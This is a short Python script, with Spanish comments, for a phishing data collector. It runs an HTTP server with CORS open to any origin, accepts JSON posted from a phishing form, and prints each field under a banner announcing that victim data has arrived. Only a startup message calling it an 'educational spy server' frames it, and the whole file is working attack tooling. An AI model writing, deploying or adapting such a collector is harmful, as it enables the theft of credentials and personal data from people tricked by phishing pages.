import http.server
import socketserver
import json

PORT = 8000

class PhishingDataHandler(http.server.SimpleHTTPRequestHandler):
    def _send_cors_headers(self):
        # Envía cabeceras para permitir peticiones desde cualquier origen
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')

    def do_OPTIONS(self):
        # Maneja las peticiones de "pre-vuelo" que envían los navegadores para verificar CORS
        self.send_response(200)
        self._send_cors_headers()
        self.end_headers()

    def do_POST(self):
        content_type = self.headers.get('Content-Type', '').split(';')[0]
        if content_type == 'application/json':
            content_length = int(self.headers['Content-Length'])
            post_data_bytes = self.rfile.read(content_length)
            
            try:
                data = json.loads(post_data_bytes.decode('utf-8'))
                print("\n" + "="*20)
                print("¡DATOS DE VÍCTIMA RECIBIDOS!")
                print("="*20)
                for key, value in data.items():
                    print(f"  [+] {key}: {value}")
                print("="*50 + "\n")
            except json.JSONDecodeError:
                print("[ERROR] No se pudieron decodificar los datos JSON recibidos.")

        self.send_response(200)
        self._send_cors_headers() # Envía las cabeceras en la respuesta POST también
        self.end_headers()
        self.wfile.write(b'{"status": "success"}')

def run_server():
    with socketserver.TCPServer(("", PORT), PhishingDataHandler) as httpd:
        print(f"[INFO] Servidor espía educativo iniciado en http://localhost:{PORT}")
        print("[INFO] CORS habilitado para aceptar peticiones de otros orígenes.")
        print("[INFO] Esperando datos del formulario... (Presione CTRL+C para detener)")
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n[INFO] Servidor detenido por el usuario.")
            httpd.server_close()

if __name__ == "__main__":
    run_server()